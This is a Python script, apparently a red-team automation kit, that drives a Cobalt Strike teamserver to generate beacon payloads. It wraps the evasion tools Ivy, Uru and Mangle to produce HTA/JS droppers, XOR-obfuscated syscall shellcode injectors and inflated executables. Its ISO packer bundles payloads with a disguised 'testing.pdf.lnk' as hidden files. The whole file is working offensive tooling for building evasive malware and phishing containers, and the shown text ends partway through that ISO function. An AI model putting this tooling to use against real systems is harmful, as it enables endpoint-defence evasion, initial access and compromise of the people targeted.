#!/usr/local/bin/python3

## Import the bridge
from colorama import Fore
from colorama import Style
from os import linesep
from sleep_python_bridge.striker import ArtifactType, CSConnector
import subprocess
import os
from argparse import ArgumentParser
from pprint import pp, pprint
from pathlib import Path, PurePath
import json
import time
import docker
import base64
import pycdlib
import paramiko
from scp import SCPClient

## Variables

# hostPayload
hostPayload = False

# JSON file
datafile = "payloads.json"

# Paths to all the things
cwd = os.getcwd()
payloadPath = cwd + "/payloads/"
bokuPayloadPath = payloadPath + "BokuLoader-payloads"
csPayloadPath = payloadPath + "arsenal-kit-payloads"
lnkPayloadPath = payloadPath + "lnk-payloads/"
defaultx86PayloadLocation= payloadPath + "/arsenal-kit-payloads/https.x86.bin"
defaultx64PayloadLocation= payloadPath + "/arsenal-kit-payloads/https.x64.bin"
dockerPath = cwd + "/docker/"
defaultArsenalKitLocation = cwd + "/bofs/arsenal-kit/"
uruConfigLocation = dockerPath + "Uru/configs/"
###################

## Write payloads
def write_payload(payloadPath,payloadName,payloadBytes,hostPayload=hostPayload):
    filename = PurePath(payloadPath,payloadName)
    with open(filename, 'wb') as file:
        file.write(payloadBytes)

## Argparse
def parseArguments():
    parser = ArgumentParser()
    parser.add_argument('host', help='The teamserver host.')
    parser.add_argument('port', help='The teamserver port.')
    parser.add_argument('username', help='The desired username.')
    parser.add_argument('password', help='The teamserver password.')
    parser.add_argument('path', help="Directory to CobaltStrike on localhost")
    #parser.add_argument("-loader", "--loader_payloads", action="store_true", dest="loader", default=False,help="option for creating payloads with a custom loader like BokuLoader")

    args = parser.parse_args()
    return args

## Boku payloads
def boku_payloads(cs, listeners):
    #grab arsenal-kit location
    arsenalKitLocation = input("What is the location of the arsenal-kit config? (i.e. /root/cobaltstrike/arsenal-kit) \n \
        Default Location: "+defaultArsenalKitLocation+"\n")
    if not arsenalKitLocation:
        arsenalKitLocation=defaultArsenalKitLocation

    #ask user if arsenal kit needs to be modified?
    txt = input("Do you need to modify the arsenal-kit and recompile it before loading Boku? \n [Yes/No] \n ")
    if txt.lower() == 'yes' or txt.lower() == 'y':
        print(f"{Fore.BLUE}[+]{Style.RESET_ALL} Modifying arsenal_kit")
        # load file
        with open(arsenalKitLocation+"arsenal_kit.config", 'r') as file :
            filedata = file.readlines()

        #Setting conditions inside arsenal-kit
        user_input = input("include_artifact_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[14]='include_artifact_kit="true"\n'
            print(f'    Changing include_artifact_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[14]='include_artifact_kit="false"\n'
            print(f'    Changing include_artifact_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')

        user_input = input("include_udrl_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[15]='include_udrl_kit="true"\n'
            print(f'    Changing include_udrl_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[15]='include_udrl_kit="false"\n'
            print(f'    Changing include_udrl_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')

        user_input = input("include_sleepmask_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[16]='include_sleepmask_kit="true"\n'
            print(f'    Changing include_sleepmask_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[16]='include_sleepmask_kit="false"\n'
            print(f'    Changing include_sleepmask_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_process_inject_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[17]='include_process_inject_kit="true"\n'
            print(f'    Changing include_process_inject_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[17]='include_process_inject_kit="false"\n'
            print(f'    Changing include_process_inject_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_resource_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[18]='include_resource_kit="true"\n'
            print(f'    Changing include_resource_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[18]='include_resource_kit="false"\n'
            print(f'    Changing include_resource_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_mimikatz_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[19]='include_mimikatz_kit="true"\n'
            print(f'    Changing include_mimikatz_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[19]='include_mimikatz_kit="false"\n'
            print(f'    Changing include_mimikatz_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        time.sleep(1)
        
        #Write file
        with open(arsenalKitLocation+'arsenal_kit.config', 'w') as file:
            file.writelines(filedata)
        #build kit again
        subprocess.call("./build_arsenal_kit.sh",cwd=arsenalKitLocation)
    # Load aggressor scripts for Boku
    script_name = "loader.cna"
    script_path = Path(script_name).resolve()
    cs.ag_load_script(script_path.name)
    time.sleep(5) # Allow time for the script to load
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Loaded {script_name} kit with ag_load_script")

    for listener in listeners:

        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating payloads for listener: {listener}")
        #reference for arguements in generatePayload
        """Geneartes a Cobalt Strike payload and returns the bytes.
        Args:
            listener (str): The listener to generate the payload for.
            artifact_type (ArtifactType): What type of payload to generate.
            staged (bool, optional): Generate a staged or stageless payload. Defaults to False.
            x64 (bool, optional): Generate an x64 or x86 payload. Defaults to True.

        Returns:
            bytes: The payload bytes.
        """        
        # x86 dll
        payloadName = f"{listener}-BokuLoader.x86.dll"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.DLL,False,False)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # x86 exe
        payloadName = f"{listener}-BokuLoader.x86.exe"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.EXE,False,False)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # x86 bin
        payloadName = f"{listener}-BokuLoader.x86.bin"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.RAW,False,False)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 dll
        payloadName = f"{listener}-BokuLoader.x64.dll"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.DLL,False,True)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 exe
        payloadName = f"{listener}-BokuLoader.x64.exe"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.EXE,False,True)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 bin
        payloadName = f"{listener}-BokuLoader.x64.bin"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.RAW,False,True)
        write_payload(bokuPayloadPath,payloadName,payloadBytes,hostPayload)

        # Unload external scripts (if desired)
        print()

        script_name = "unload_scripts.cna"
        script_path = Path(script_name).resolve()
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL}  Unloading {script_name} kit with ag_load_script")
        cs.ag_load_script(script_path.name)
        print(f"{Fore.GREEN}[+]{Style.RESET_ALL}  Done")

        time.sleep(5) # Allow time for the script to unload

def cs_payloads(cs, listeners):
    #grab arsenal-kit location
    arsenalKitLocation = input("What is the location of the arsenal-kit config? (i.e. /root/cobaltstrike/arsenal-kit) \n \
        Default Location: "+defaultArsenalKitLocation+"\n")
    if not arsenalKitLocation:
        arsenalKitLocation=defaultArsenalKitLocation

    #ask user if arsenal kit needs to be modified?
    txt = input("Do you need to modify the arsenal-kit and recompile it before creating CS payloads? \n [Yes/No] \n ")
    if txt.lower() == 'yes' or txt.lower() == 'y':
        print(f"{Fore.BLUE}[+]{Style.RESET_ALL} Modifying arsenal_kit")
        # load file
        with open(arsenalKitLocation+"arsenal_kit.config", 'r') as file :
            filedata = file.readlines()

        #Setting conditions inside arsenal-kit
        user_input = input("include_artifact_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[14]='include_artifact_kit="true"\n'
            print(f'    Changing include_artifact_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[14]='include_artifact_kit="false"\n'
            print(f'    Changing include_artifact_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')

        user_input = input("include_udrl_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[15]='include_udrl_kit="true"\n'
            print(f'    Changing include_udrl_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[15]='include_udrl_kit="false"\n'
            print(f'    Changing include_udrl_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')

        user_input = input("include_sleepmask_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[16]='include_sleepmask_kit="true"\n'
            print(f'    Changing include_sleepmask_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[16]='include_sleepmask_kit="false"\n'
            print(f'    Changing include_sleepmask_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_process_inject_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[17]='include_process_inject_kit="true"\n'
            print(f'    Changing include_process_inject_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[17]='include_process_inject_kit="false"\n'
            print(f'    Changing include_process_inject_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_resource_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[18]='include_resource_kit="true"\n'
            print(f'    Changing include_resource_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[18]='include_resource_kit="false"\n'
            print(f'    Changing include_resource_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        
        user_input = input("include_mimikatz_kit [True/False]")
        if user_input.lower() == 'true' or user_input.lower() == 't':
            filedata[19]='include_mimikatz_kit="true"\n'
            print(f'    Changing include_mimikatz_kit="{Fore.GREEN}true{Style.RESET_ALL}"')
        else:
            filedata[19]='include_mimikatz_kit="false"\n'
            print(f'    Changing include_mimikatz_kit="{Fore.YELLOW}false{Style.RESET_ALL}"')
        time.sleep(1)
        
        #Write to arsenal-kit config
        with open(arsenalKitLocation+'arsenal_kit.config', 'w') as file:
            file.writelines(filedata)
        #build kit again
        subprocess.call("./build_arsenal_kit.sh",cwd=arsenalKitLocation)

    print(f"{Fore.GREEN}[+]{Style.RESET_ALL} Done building arsenal_kit")
    print(f"{Fore.BLUE}[+]{Style.RESET_ALL} Loading arsenal_kit")
    # Load external scripts (if desired)
    script_name = "arsenal_loader.cna"
    script_path = Path(script_name).resolve()

    cs.ag_load_script(script_path.name)
    time.sleep(5) # Allow time for the script to load
    print(f"{Fore.GREEN}[+]{Style.RESET_ALL}  Loaded {script_name} kit with ag_load_script")

    for listener in listeners:
        print(f"[*] Creating payloads for listener: {listener}")
        """Geneartes a Cobalt Strike payload and returns the bytes.

        Args:
            listener (str): The listener to generate the payload for.
            artifact_type (ArtifactType): What type of payload to generate.
            staged (bool, optional): Generate a staged or stageless payload. Defaults to False.
            x64 (bool, optional): Generate an x64 or x86 payload. Defaults to True.

        Returns:
            bytes: The payload bytes.
        """
        # payloadpath
        #payloadPath = "/root/tools/cobaltstrike_4.6/go-kit/payloads/artifact-kit-payloads/"
        # x86 dll
        payloadName = f"{listener}.x86.dll"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL}  Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.DLL,False,False)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

        # x86 exe
        payloadName = f"{listener}.x86.exe"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.EXE,False,False)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

        # x86 bin
        payloadName = f"{listener}.x86.bin"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.RAW,False,False)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 dll
        payloadName = f"{listener}.x64.dll"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.DLL,False,True)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 exe
        payloadName = f"{listener}.x64.exe"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.EXE,False,True)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

        # x64 bin
        payloadName = f"{listener}.x64.bin"
        print(f"{Fore.CYAN}[+]{Style.RESET_ALL} Creating {payloadName}")
        payloadBytes = cs.generatePayload(listener,ArtifactType.RAW,False,True)
        write_payload(csPayloadPath,payloadName,payloadBytes,hostPayload)

def tikiPayload():

    txt = input("Provide absolute path to x86 raw payload \
    (i.e. /root/payloads/http.x86.bin): \n\
    Default will be "+defaultx86PayloadLocation+" \n")
    
    #default payload location
    if not txt:
        txt = defaultx86PayloadLocation

    #read raw payload
    with open(txt, "rb") as payload:
        encoded_payload = base64.b64encode(payload.read()).decode("UTF-8")

    # Read tiki template
    with open(cwd + "/payloads/tiki_payloads/tiki_template.html", "r") as template:
        tikitemplate = template.readlines()

    tikitemplate[7]='var es ="' + encoded_payload +'";\n'

    #print(tikitemplate)

    #Write tiki payload
    with open(cwd + "/payloads/tiki_payloads/tiki_payload.html", "w") as file:
        file.writelines(tikitemplate)

    print("[+] Tiki Payload created!")
    print("[+] Payload found under payloads/tiki_payloads/tiki_payload.html\n")
    time.sleep(2)

def ivyPayload():
    print()
    # create docker image
    client = docker.from_env()
    print(f'[+] Creating ivy docker image')
    client.images.build(path=dockerPath+"Ivy",tag="ivy-image")

    #get domain from user
    defaultIvyDomain = "https://test.domain.com"
    ivyDomain = input("What is the name of the domain for this engagement? (i.e. https://l33t.hacker.net) \n Default: https://test.domain.com")
    if not ivyDomain:
        ivyDomain = defaultIvyDomain

    #get payload from user
    defaultx86IvyPayloadPath = "arsenal-kit-payloads/https.x86.bin"
    ivyx86PayloadPath = input("Provide x86 raw payload path: (Default: payloads/arsenal-kit-payloads/https.x86.bin) \n ")    
    if not ivyx86PayloadPath:
        ivyx86PayloadPath = defaultx86IvyPayloadPath
    
    defaultx64IvyPayloadPath = "arsenal-kit-payloads/https.x64.bin"
    ivyx64PayloadPath = input("Provide x64 raw payload path: (Default: payloads/arsenal-kit-payloads/https.x64.bin) \n ")
    if not ivyx64PayloadPath:
        ivyx64PayloadPath = defaultx64IvyPayloadPath
    
    #declare some vars for Ivy Naming
    ivyPayloadCreation = True
    defaultIvyHTAFileName = "https-ivy.hta"
    defaultIvyJSFileName = "https-ivy.js"
    
    # create payload
    while ivyPayloadCreation == True:
        ivyUserInput = input("Which Ivy payload would you like to generate? \n\
        [0] - hta \n\
        [1] - js \n\
        [2] - Exit \n\
        ")
        match ivyUserInput:
            case '0':
                ivyFileName = input("What is the name of your ivy payload? \n\
                Default: https-ivy.hta")
                if not ivyFileName:
                    ivyFileName = defaultIvyHTAFileName
                print(f'[+] Creating ivy hta payload')
                client.containers.run(image="ivy-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='-Ix64 /go/payloads/'+ivyx64PayloadPath+' -Ix86 /go/payloads/'+ivyx86PayloadPath+' -O /go/payloads/ivy-payloads/'+defaultIvyHTAFileName+' -P Local -debug -delivery hta -stageless -unhook -url '+ivyDomain+'')
                print("[+] Ivy Payload created!")
                print("[+] Payload found under payloads/ivy_payloads")
            case '1':
                ivyFileName = input("What is the name of your ivy payload? \n\
                Default: https-ivy.js")
                if not ivyFileName:
                    ivyFileName = defaultIvyJSFileName
                print(f'[+] Creating ivy js payload')
                client.containers.run(image="ivy-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='-Ix64 /go/payloads/'+ivyx64PayloadPath+' -Ix86 /go/payloads/'+ivyx86PayloadPath+' -O /go/payloads/ivy-payloads/'+defaultIvyJSFileName+' -P Local -debug -delivery macro -stageless -unhook -url '+ivyDomain+'')
                print("[+] Ivy Payload created!")
                print("[+] Payload found under payloads/ivy_payloads")
            case '2':
                print("Leaving Ivy...")
                ivyPayloadCreation = False
            case _:
                    print("Invalid input, goodbye!")
                    return

    #print(f'[+] Creating ivy hta payload')
    #client.containers.run(image="ivy-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='-Ix64 /go/payloads/'+ivyx64PayloadPath+' -Ix86 /go/payloads/'+ivyx86PayloadPath+' -O /go/payloads/ivy-payloads/https-ivy.hta -P Local -debug -delivery hta -stageless -unhook -url '+ivyDomain+'')
    #print(f'[+] Creating ivy js payload')
    #client.containers.run(image="ivy-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='-Ix64 /go/payloads/'+ivyx64PayloadPath+' -Ix86 /go/payloads/'+ivyx86PayloadPath+' -O /go/payloads/ivy-payloads/https-ivy.js -P Local -debug -delivery macro -stageless -unhook -url '+ivyDomain+'')

def uruPayload():
    print()
    # load file
    uruConfigLocation = dockerPath + "Uru/configs/"
    with open(uruConfigLocation+"payload_template.yml", 'r') as file :
        filedata = file.readlines()

    #modify uru configs
    dictionaryWords = input("How many dictionary words? (i.e. 110,120,123, etc.) \n Default 100:")
    if not dictionaryWords:
        dictionaryWords='100'
    filedata[18]='          value: '+dictionaryWords+'\n'
    xorKey = input("What is the XOR Key? (i.e. l33t, 31337, etc.) \n Default: h4x")
    if not xorKey:
        xorKey='h4x'
    filedata[23]='          value: "'+xorKey+'"\n'
    delay = input("How long should the delay be (in seconds)? (i.e 10, 20, 30) \n Default: 15")
    if not delay:
        delay='10'
    filedata[11]='          value: "'+delay+'"\n'
    uruRawPayload = input("What is the location of the raw payload for Uru (must be in payloads directory)? (i.e. payload/https.x64.bin) \n Default: arsenal-kit-payloads/https.x64.bin")
    if not uruRawPayload:
        uruRawPayload = "arsenal-kit-payloads/https.x64.bin"
    # create payload
    # docker run -v "/root/tools/cobaltstrike_4.6/go-kit/payloads/:/go/payloads" --entrypoint bash -it uru -c "./uru generate -c /go/configs/payload_1.yml -p /go/payloads/arsenal-kit-payloads/http.x64.bin -o test.exe && mv test.exe payloads/uru-payloads/test.exe"
    print(f'[+] Creating uru GoSyscall payload')
    
    #to chain multiple commands you have to "hack" it by running bash -c 
    #unfortunately directly outputting to /payloads runs into an error I can't figure out
    #### error while moving the payload: rename /go/out/out_PyfR/20220713_FC0E_main.exe /go/payloads/test.exe: invalid cross-device link
    # container = client.containers.run(image="uru-image",volumes={'/root/tools/cobaltstrike_4.6/go-kit/payloads': {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_1.yml -p /go/payloads/arsenal-kit-payloads/https.x64.bin -o go-shellcode-syscall.exe && mv go-shellcode-syscall.exe payloads/uru-payloads/go-shellcode-syscall.exe"')
    # SOME TROUBLESHOOTING TO REFERENCE FOR LATER
    #print(container)
    #print(client)
    #uru_container = client.containers.get('uru-image')
    #stat = uru_container.exec_run(cmd='ls')
    #print(stat)

    uruPayloadCreation = True

    while uruPayloadCreation == True:
        uruUserInput = input("Which Uru injection type would you like to generate? \n\
        [0] -  Uru go-shellcode-syscall payload \n\
        [1] -  Uru CreateThreadNative payload \n\
        [2] -  Uru NtQueueApcThreadEx-Local payload \n\
        [3] -  Uru BananaSyscall payload \n\
        [4] -  Uru BananaNtQueueApcThreadEx payload \n\
        [5] -  Exit \n\
        ")
        match uruUserInput:
            case '0':
                #Write to uru config
                filedata[30]='    - name: windows/native/local/go-shellcode-syscall\n'
                with open(uruConfigLocation+'payload_1.yml', 'w') as file:
                    file.writelines(filedata)
                #payload name
                uruPayloadName = input("What is the name of the payload? \n Default: uru-go-syscall.exe")
                if not uruPayloadName:
                    uruPayloadName = "uru-go-syscall.exe"
                # create docker image
                client = docker.from_env()
                print(f'[+] Creating uru docker image')
                client.images.build(path=dockerPath+"Uru",tag="uru-image")
                print(f'[+] Creating uru go-shellcode-syscall payload')
                client.containers.run(image="uru-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_1.yml -p /go/payloads/'+uruRawPayload+' -o '+uruPayloadName+' && mv '+uruPayloadName+' payloads/uru-payloads/'+uruPayloadName+'"')
                print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Uru payload created in payloads/uru-payloads directory')
            case '1':
                #Write to uru config
                filedata[30]='    - name: windows/native/local/CreateThreadNative\n'
                with open(uruConfigLocation+'payload_2.yml', 'w') as file:
                    file.writelines(filedata)
                #payload name
                uruPayloadName = input("What is the name of the payload? \n Default: uru-go-CreateThreadNative.exe")
                if not uruPayloadName:
                    uruPayloadName = "uru-go-CreateThreadNative.exe"
                # create docker image
                client = docker.from_env()
                print(f'[+] Creating uru docker image')
                client.images.build(path=dockerPath+"Uru",tag="uru-image")
                print(f'[+] Creating uru go-shellcode-syscall payload')
                client.containers.run(image="uru-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_2.yml -p /go/payloads/'+uruRawPayload+' -o '+uruPayloadName+' && mv '+uruPayloadName+' payloads/uru-payloads/'+uruPayloadName+'"')
                print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Uru payload created in payloads/uru-payloads directory')
            case '2':
                #Write to uru config
                filedata[30]='    - name: windows/native/local/NtQueueApcThreadEx-Local\n'
                with open(uruConfigLocation+'payload_3.yml', 'w') as file:
                    file.writelines(filedata)
                #payload name
                uruPayloadName = input("What is the name of the payload? \n Default: uru-go-NtQueueApcThreadEx.exe")
                if not uruPayloadName:
                    uruPayloadName = "uru-go-NtQueueApcThreadEx.exe"
                # create docker image
                client = docker.from_env()
                print(f'[+] Creating uru docker image')
                client.images.build(path=dockerPath+"Uru",tag="uru-image")
                print(f'[+] Creating uru go-shellcode-syscall payload')
                client.containers.run(image="uru-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_3.yml -p /go/payloads/'+uruRawPayload+' -o '+uruPayloadName+' && mv '+uruPayloadName+' payloads/uru-payloads/'+uruPayloadName+'"')
                print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Uru payload created in payloads/uru-payloads directory')            
            case '3':
                #Write to uru config
                filedata[30]='    - name: windows/bananaphone/local/go-shellcode-syscall\n'
                with open(uruConfigLocation+'payload_4.yml', 'w') as file:
                    file.writelines(filedata)
                #payload name
                uruPayloadName = input("What is the name of the payload? \n Default: uru-bananaphone-syscall.exe")
                if not uruPayloadName:
                    uruPayloadName = "uru-bananaphone-syscall.exe"
                # create docker image
                client = docker.from_env()
                print(f'[+] Creating uru docker image')
                client.images.build(path=dockerPath+"Uru",tag="uru-image")
                print(f'[+] Creating uru go-shellcode-syscall payload')
                client.containers.run(image="uru-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_4.yml -p /go/payloads/'+uruRawPayload+' -o '+uruPayloadName+' && mv '+uruPayloadName+' payloads/uru-payloads/'+uruPayloadName+'"')
                print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Uru payload created in payloads/uru-payloads directory')
            case '4':
                #Write to uru config
                filedata[30]='    - name: windows/bananaphone/local/NtQueueApcThreadEx-Local\n'
                with open(uruConfigLocation+'payload_5.yml', 'w') as file:
                    file.writelines(filedata)
                #payload name
                uruPayloadName = input("What is the name of the payload? \n Default: uru-bananaphone-NtQueueApcThreadEx.exe")
                if not uruPayloadName:
                    uruPayloadName = "uru-bananaphone-NtQueueApcThreadEx.exe"
                # create docker image
                client = docker.from_env()
                print(f'[+] Creating uru docker image')
                client.images.build(path=dockerPath+"Uru",tag="uru-image")
                print(f'[+] Creating uru go-shellcode-syscall payload')
                client.containers.run(image="uru-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_1.yml -p /go/payloads/'+uruRawPayload+' -o '+uruPayloadName+' && mv '+uruPayloadName+' payloads/uru-payloads/'+uruPayloadName+'"')
                print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Uru payload created in payloads/uru-payloads directory')
            case '5':
                print("Exiting Uru...")
                uruPayloadCreation = False
            case _:
                print("Invalid input, goodbye!")
    #print(f'[+] Creating uru CreateThreadNative payload')
    #client.containers.run(image="uru-image",volumes={'/root/tools/cobaltstrike_4.6/go-kit/payloads': {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_2.yml -p /go/payloads/arsenal-kit-payloads/https.x64.bin -o go-CreateThreadNative.exe && mv go-CreateThreadNative.exe payloads/uru-payloads/go-CreateThreadNative.exe"')
    
    #print(f'[+] Creating uru NtQueueApcThreadEx-Local payload')
    #client.containers.run(image="uru-image",volumes={'/root/tools/cobaltstrike_4.6/go-kit/payloads': {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_3.yml -p /go/payloads/arsenal-kit-payloads/https.x64.bin -o go-NtQueueApcThreadEx-Local.exe && mv go-NtQueueApcThreadEx-Local.exe payloads/uru-payloads/go-NtQueueApcThreadEx-Local.exe"')
    
    #print(f'[+] Creating uru BananaSyscall payload')
    #client.containers.run(image="uru-image",volumes={'/root/tools/cobaltstrike_4.6/go-kit/payloads': {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_4.yml -p /go/payloads/arsenal-kit-payloads/https.x64.bin -o go-BananaSyscall.exe && mv go-BananaSyscall.exe payloads/uru-payloads/go-BananaSyscall.exe"')
    
    #print(f'[+] Creating uru BananaNtQueueApcThreadEx payload')
    #client.containers.run(image="uru-image",volumes={'/root/tools/cobaltstrike_4.6/go-kit/payloads': {'bind': '/go/payloads', 'mode': 'rw'}}, command='/bin/bash -c "/go/uru generate -c /go/configs/payload_5.yml -p /go/payloads/arsenal-kit-payloads/https.x64.bin -o go-BananaNtQueueApcThreadEx.exe && mv go-BananaNtQueueApcThreadEx.exe payloads/uru-payloads/go-BananaNtQueueApcThreadEx.exe"')

def manglePayload():
    print()
    # create docker image
    client = docker.from_env()
    print(f'[+] Creating mangle docker image')
    client.images.build(path=dockerPath + "Mangle",tag="mangle-image")
    # create payload
    #docker run -v "/root/tools/cobaltstrike_4.6/go-kit/payloads/:/go/payloads" --entrypoint bash -it mangle-image -c "/go/mangle -I /go/payloads/arsenal-kit-payloads/https.x64.exe -S 100 -O /go/payloads/mangle-payloads/inflated-https.exe"
    manglePayload = input("What is the location of the payload for Mangle to inflate? (must be in payloads directory)? (i.e. payload/https.x64.exe) \n Default: arsenal-kit-payloads/https.x64.exe")
    if not manglePayload:
        manglePayload = "arsenal-kit-payloads/https.x64.exe"
    mangleSize = input("How much do you want to inflate this payload (in MB)? (i.e. 100, 150, 200, etc.) \n Default: 100")
    if not mangleSize:
        mangleSize = "100"
    payloadName = input("What is the name of this payload? \n Default: https-inflated.exe")
    if not payloadName:
        payloadName = "https-inflated.exe"
    stripGoHeaders = input("Do you want to strip go headers? [Yes/No] \n Default: No")
    if stripGoHeaders.lower() == 'yes' or stripGoHeaders.lower() == 'y':
        client.containers.run(image="mangle-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/go/mangle -I /go/payloads/'+manglePayload+' -M -S '+mangleSize+' -O /go/payloads/mangle-payloads/'+payloadName+'')
    else:
        client.containers.run(image="mangle-image",volumes={payloadPath: {'bind': '/go/payloads', 'mode': 'rw'}}, command='/go/mangle -I /go/payloads/'+manglePayload+' -S '+mangleSize+' -O /go/payloads/mangle-payloads/'+payloadName+'')
        print(f'{Fore.GREEN}[*]{Style.RESET_ALL} Mangle Inflated Payload created in payloads/uru-payloads directory')
        
def isoPacker():
    fileName = []
    isoName = input("What is the name of this iso? \n Default: test.iso")
    if not isoName:
        isoName = "test.iso"
    isoVolumeName = input("What is the name of this ISO Volume? \n Default: Test")
    if not isoVolumeName:
        isoVolumeName = "Test"
    numOfFiles = input("How many files stuffed into ISO? (i.e. 1, 2, 3, etc.) \n Default: 2")
    if not numOfFiles:
        numOfFiles = '2'
    for x in range(int(numOfFiles)):
        name = input("["+str(x)+"] Insert name of file to be stuffed into the ISO (must provide complete path)? \n Default: "+csPayloadPath+"/https.x64.exe")
        if not name:
            fileName.append(csPayloadPath+"/https.x64.exe")
            fileName.append(lnkPayloadPath+"testing.pdf.lnk")
            break 
        else: 
            fileName.append(name)
    
    for i, payload in enumerate(fileName):
        print("["+str(i)+"] - ", payload)
    hiddenOption = input("Which stuffed files should be hidden?(i.e. 1 or 1,3) \n Default: 0")
    selectedHiddenItems = []
    if not hiddenOption:
        options = []
        options.append(0)
        selectedHiddenItems = [fileName[i] for i in options]
    else:
        options = []
        options = hiddenOption.split(',')
        test_list = [int(i) for i in options]
